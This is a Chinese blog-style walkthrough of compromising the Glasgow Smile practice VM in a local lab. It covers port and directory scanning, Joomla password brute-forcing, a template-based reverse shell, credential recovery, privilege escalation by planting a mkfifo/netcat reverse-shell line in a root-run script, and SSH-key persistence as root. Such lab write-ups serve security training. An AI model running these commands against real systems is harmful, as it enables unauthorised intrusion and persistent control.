---
title: Glasgowmile渗透笔记
description: Glasgowmile靶场
slug: glasgowmile
authors: fish
tags: [渗透, 总结]
date: 2024-05-20
hide_table_of_contents: false
---

总结了一下渗透Glasgowmile的步骤，仅供学习交流使用

<!-- truncate -->

## 使用工具

nmap，dirsearch，cewl，pspy，kali

## 启动环境

启动虚拟机，自动分配IP `192.168.1.21`

![1](https://pic.imgdb.cn/item/6646ffe2d9c307b7e9ee471c.png)

攻击方虚拟机

![2](https://pic.imgdb.cn/item/66471da5d9c307b7e913bd21.png)

攻击IP `192.168.1.128`

靶机IP `192.168.1.21`

## 信息收集

nmap扫描开放的端口

`nmap -v -n -T4 192.168.1.21`

`-v` 	显示显示冗余信息(扫描细节)

`-n` 	表示不进行dns解析

`-T0~6`  	设置扫描速度，越高越快对系统影响越大，一般T4

`-p-` 	扫描所有端口（默认扫描1k端口）

`-sV` 	对端口上的服务程序版本进行扫描

`-A` 	强力扫描，耗时长

![3](https://pic.imgdb.cn/item/6647414ed9c307b7e94d5985.png)

可以看到目标地址开了两个端口，分别为

ssh  22端口

http 80端口

在浏览器打开目标地址

![4](https://pic.imgdb.cn/item/664744dfd9c307b7e951efc9.png)

简单尝试可以发现目标地址服务器为Apache/2.4.38，linux系统

![5](https://pic.imgdb.cn/item/664746c0d9c307b7e9555b69.png)

使用dirsearch工具扫描网络目录

```bash
[*] dirSearch Release: v0.4.2 (2021.06.16)

[*] require:
    python 3.x

[*] options:

    -u        目标url
    -e        扩展名列表，以逗号分隔（例如：php，asp）
    -w        自定义字典文件
    -R        最大递归子目录级别（默认1：仅rootdir + 1 dir）
    -x        排除状态码，以逗号分隔（例如：301，500）
    -F        跟随url重定向
    --proxy   自定义http代理（例如：127.0.0.1:8080）

[*] useage:
    python3 dirsearch.py -e "*" --proxy=socks5://185.106.176.135:1002 -u http://exp.com/
```

`python3 dirsearch.py -u "http://192.168.1.21/"`

![6](https://pic.imgdb.cn/item/66474d6ad9c307b7e95ec443.png)

可以看到网站的两个目录，访问这两个网页，我们可以看到一个前端页面和一个后台管理页面

:::note



joomla是一个著名的cms，可以在网络上找到不同版本的漏洞

后台管理默认用户名为jommla

 ![joomlachina.cn/images/logos/joomlachinese.svg](https://www.joomlachina.cn/images/logos/joomlachinese.svg)



:::

![7](https://pic.imgdb.cn/item/66474f99d9c307b7e961aa86.png)

## 密码爆破

抓包管理员界面，用户名密码明文传输且尝试后无验证码，进行密码爆破

![8](https://pic.imgdb.cn/item/66483f5ed9c307b7e95a1b4e.png)

在kali中用cewl生成网站的字典

`cewl http://192.168.1.21/joomla/ -m 5 -d 1 -w mypass.txt`

`-m 5`	参数表示最小的单词长度设为5

`-d 1`	参数表示cewl只会爬取目标URL的1个深度

`-w` 	 参数表示将抓取的单词写入名为"mypass.txt"的文件

使用字典攻击，成功爆破密码

> username=joomla
>
> passwd=Gotham

![9](https://pic.imgdb.cn/item/664841cfd9c307b7e95d3371.png)

进入到管理员后台，以超级用户身份登录

![10](https://pic.imgdb.cn/item/66484367d9c307b7e95f92b3.png)

## 反弹shell

打开joomla的网页模板，修改网页代码

![11](https://pic.imgdb.cn/item/66485d5bd9c307b7e97fbfe5.png)

![12](https://pic.imgdb.cn/item/66485d5bd9c307b7e97fc05f.png)

访问网页 ``http://192.168.1.21/joomla/templates/beez3/index.php`` 可以看到修改成功

![13](https://pic.imgdb.cn/item/66486016d9c307b7e983ad8a.png)

命令行中用nc监听4444端口，获取反弹的shell

`nc -vlnp 4444`

"nc" 是 "netcat" 的简称，这是一个在 Linux 系统中常用的网络工具，可用于读取和写入数据流，支持 TCP 和 UDP 协议

`-v`	verbose 的缩写，用于启用详细（verbose）模式，执行操作时会显示详细的操作信息

`-l`	listen 的缩写，用于创建一个监听连接

`-n`	表示不进行 DNS 或服务查找，可以提高 nc 命令的效率

`-p`	port 的缩写，指定监听端口的号码

![14](https://pic.imgdb.cn/item/66486602d9c307b7e98ad284.png)

启动bash方便下一步操作

`python -c "import pty;pty.spawn('/bin/bash')" `

![15](https://pic.imgdb.cn/item/66488a1cd9c307b7e9b4ab14.png)

::: note



pty模块定义了一些处理“伪终端”概念的操作：启动另一个进程并能以程序方式在其控制终端中进行
读写

"pty.spawn('/bin/bash')" 这部分会调用pty模块的spawn函数，spawn函数会启动一个新的进程，并在这个新进程中运行指定的程序。pty.spawn(*argv*[, *master_read*[, *stdin_read*]]) 。在这个例子中，它会启动一个新的bash shell

这条命令通常在你需要从当前Shell环境（比如一个受限的Shell或一个不完全交互式的Shell）创建一个全功能（完全交互式的）Shell环境时使用。



::: 

查看主机名称及版本

```bash
uname -a

cat /etc/*-release

getconf LONG_BIT //查看操作系统位数
```

名称：glasgowsmile

版本：Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux

![16](https://pic.imgdb.cn/item/66488c53d9c307b7e9b8f340.png)

查看可登录用户

` cat /etc/passwd | grep -v "nologin"`

`cat /etc/passwd` 是查看系统用户列表的命令，`/etc/passwd` 文件存储了系统所有用户的信息

`grep -v "nologin"` 用来过滤出结果中不包含 "nologin" 的行。在 /etc/passwd 文件中，包含 "nologin" 的行一般表示系统服务或者非交互式账户，这些账户通常不允许登录

因此，这个命令的意思是列出所有可以登录的用户（也就是过滤掉所有不能登录的用户）。这个命令用于查看系统中哪些用户是可以进行交互式登录的。

总的来说，该命令将会展示所有具有登录权限的用户的列表

该系统的用户有：**root,rob,abner,penguin**

![17](https://pic.imgdb.cn/item/66488fe8d9c307b7e9bd1cb5.png)

## 提升权限

查看当前用户家目录中的文件，得到提示和数据库用户名密码

> user=joomla
>
> password=babyjoker

![18](https://pic.imgdb.cn/item/66489cb1d9c307b7e9cd0b41.png)

![19](https://pic.imgdb.cn/item/66489d8fd9c307b7e9cdfe52.png)

登录数据库

![20](https://pic.imgdb.cn/item/6648a214d9c307b7e9d32189.png)

查看两个数据库后，获取到有效信息

```sql
MariaDB [(none)]> use batjoke;
use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [batjoke]> select * from equipment;
select * from equipment;
Empty set (0.000 sec)

MariaDB [batjoke]> select * from taskforce;
select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.000 sec)

MariaDB [batjoke]>
```

可以看出这些密码是经过Base64编码过后的，解密得到rob账户密码

> ???AllIHaveAreNegativeThoughts???

:::note[关于编码]



实际上，没有充足的经验，我并没有一眼看出这是用什么方式加密/编码的，但是AI帮我识别出来了🤪



:::

成功登录到rob账户

![21](https://pic.imgdb.cn/item/66498bb8d9c307b7e9db6a4c.png)

浏览家目录的`user.txt`文件，得到flag

![22](https://pic.imgdb.cn/item/66498d6ad9c307b7e9ddcb98.png)

查看Abnerineedyourhelp文件，看到一段密文，可能经过凯撒加密

![23](https://pic.imgdb.cn/item/66498f63d9c307b7e9e08487.png)

经过偏移量25，Base64解密得到

> Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
> Now I need your help Abner, use this password, you will find the right way to solve the enigma. I33hope99my0death000makes44more8cents00than0my0life0

分析这段密文，接下来要登录abner账户

![24](https://pic.imgdb.cn/item/66499587d9c307b7e9e8be1b.png)

浏览家目录的`user2.txt`，得到第二个flag

![25](https://pic.imgdb.cn/item/66499649d9c307b7e9ea0974.png)

浏览bash历史记录

![26](https://pic.imgdb.cn/item/66499cfbd9c307b7e9f26645.png)

查找 `.dear_penguins.zip` 文件

`find / -name ".dear_penguins.zip" 2> /dev/null`

`2>/dev/null`：在这里，"2>" 是重定向标准错误输出的操作。"2>/dev/null" 的意思就是忽略所有错误信息。

在 Linux 系统中，"/dev/null" 是一个特殊的文件，用于将数据彻底丢弃。它是一个特殊的文件设备，可以通过标准输入和标准输出访问。读取 "/dev/null" 将会立即返回 EOF（文件结束符），因此所有写入它的数据都将被丢弃。

在使用 "find /" 这样的命令时，由于有些目录可能没有权限访问，导致你可能会遇到很多 "Permission denied" 的错误。使用 "2>/dev/null" 可以让你忽略这些错误，只看到你关心的结果。

这条命令是在Linux系统中查找名为 ".dear_penguins.zip" 文件的命令，同时忽略所有的错误信息。

![27](https://pic.imgdb.cn/item/6649a05ed9c307b7e9f755dd.png)

复制 `.dear_penguins.zip` 文件到tmp目录解压，尝试abner用户密码，解压成功

`cp .dear_penguins.zip /tmp/dear.zip`

`unzip dear.zip`

![28](https://pic.imgdb.cn/item/6649a51fd9c307b7e9fe425a.png)

查看解压文件，得到penguin账户密码

> scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz

![29](https://pic.imgdb.cn/item/6649a61ad9c307b7e9ff9572.png)

登录penguin账户成功

![30](https://pic.imgdb.cn/item/6649a667d9c307b7e9fffc62.png)

在penguin账户家目录下的 `SomeoneWhoHidesBehindAMask` 文件夹中找到第三个flag

![31](https://pic.imgdb.cn/item/6649a729d9c307b7e900dcd5.png)

查看 `.trash_old` 文件，这个文件可能是一个自动执行脚本，并且其在root组中，我们可以监控包含该文件的进程

![32](https://pic.imgdb.cn/item/6649a83ed9c307b7e901e2bc.png)

上传pspy工具

pspy是一个命令行工具，它可以在没有Root权限的情况下，监控Linux进程。

在本地启动http服务，在目标服务器上从本地下载pspy

`wget http://192.168.1.128:8888/pspy64`

::: note 



有些服务器不允许上传文件，允许下载，我们可以在线下载或者从自己搭建的服务器下载文件。

搭建本地服务器：在文件目录启动终端，使用python模块启动一个简单的HTTP服务器

`python -m http.server 8888`

`-m`	（module）启动模块



:::

![33](https://pic.imgdb.cn/item/6649afd3d9c307b7e909f614.png)

更改权限启动pspy

`chmod 777 pspy64` 

r=4, w=2, x=1

`chmod +x pspy64`

+x  会将user, group, other的权限都+x

![34](https://pic.imgdb.cn/item/6649b224d9c307b7e90e8879.png)

![35](https://pic.imgdb.cn/item/6649b2c1d9c307b7e90f6e40.png)

## 借权提升

通过监控进程我们看到UID=0的用户（也就是root用户）在周期性调用 `.trash_old`这个脚本，因此我们可以往该脚本里写入脚本，从而达到借权提升用户权限的目的

使用ssh工具连接到靶机，编辑`.trash_old`文件，插入反弹shell代码

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.128 2222 > /tmp/f `

这个命令是创建一个基于FIFO（先入先出文件，又称为"命名管道"）和`netcat`(nc)的反向shell。

1. `rm /tmp/f`: 这会尝试删除 `/tmp/f` 文件（如果存在的话）

2. `mkfifo /tmp/f`：这会创建一个命名的管道文件 `/tmp/f`。FIFO，也被称为命名管道，提供了一种在不相关的进程之间进行通信的机制

3. `cat /tmp/f | /bin/sh -i 2>&1`：这会从管道 `/tmp/f` 中读取数据并将其发送到交互式shell `/bin/sh`。然后，shell的输出和错误将被重定向并返回到管道中

4. `nc 192.168.1.128 2222`: 这会使用 `netcat (nc)` 命令创建一个到 `192.168.1.128` IP地址上的 `2222` 端口的网络连接。这通常是控制端（攻击者）的机器

5. `> /tmp/f`：所有的 `nc` 命令的输出和shell的交互都会重定向回 `fifo` 文件，然后 pipe 到 `cat` 中

在这个命令的整个生命周期中，`cat` 从FIFO读取数据并发送给`sh`进程，然后 `sh`进程的输出被发送给 `nc`，最后 `nc` 的输出又被发送回FIFO，形成一个循环。由于这个循环的存在，即使在网络连接中断的情况下，反向shell也能继续运行。只要网络连接重新建立，控制端就能重新获取对反向shell的控制

![36](https://pic.imgdb.cn/item/6649be16d9c307b7e91c4835.png)

在终端启用netcat命令监听2222端口，获取shell，得到了root权限！:tada:

*由于某些原因，导致靶机IP发生一些变化`192.168.1.21 > 192.168.1.135`*

`nc -vlnp 2222`

这样的连接方式是极其被动的，不能主动连接，且如果脚本由于某种原因停止运行，那么我们将连接不上目标，因此我们接下来需要进行权限维持

![37](https://pic.imgdb.cn/item/6649d894d9c307b7e93e182b.png)

得到通关flag

![38](https://pic.imgdb.cn/item/6649dbc8d9c307b7e94279b4.png)

## 权限维持

使用kali生成一对rsa密钥

` ssh-keygen -t rsa`

![39](https://pic.imgdb.cn/item/6649dfa2d9c307b7e947dfb9.png)

启动http服务，把公钥传输到服务器上

` wget http://192.168.1.128:8888/id_rsa.pub`

![40](https://pic.imgdb.cn/item/6649e156d9c307b7e949a1fa.png)

在root家目录下创建 `.ssh`目录

`mkdir .ssh`

创建 `authorized_keys`文件

 `touch /root/.ssh/authorized_keys`

把公钥写入`authorized_keys`文件

`cat /tmp/id_rsa.pub > /root/.ssh/authorized_keys`

![41](https://pic.imgdb.cn/item/6649e2fcd9c307b7e94b5b47.png)

如此便可以通过密钥免密直连服务器，维持了root权限

`ssh -i "C:\Users\Anonymous\Desktop\file\id_rsa" root@192.168.1.135`

`-i` 选项告诉 SSH 用哪个文件作为登录密钥

![42](https://pic.imgdb.cn/item/6649e3c3d9c307b7e94c351a.png)

## 结语

总的来说Glasgowmile靶场是一个非常基础的靶场，主要帮助新手熟悉命令、工具的使用。

从信息收集到一步一步提升权限，循序渐进很有规律，没有许多弯弯绕绕，对于初学网安的新手是很好的练习靶场。

完结撒花:tada:
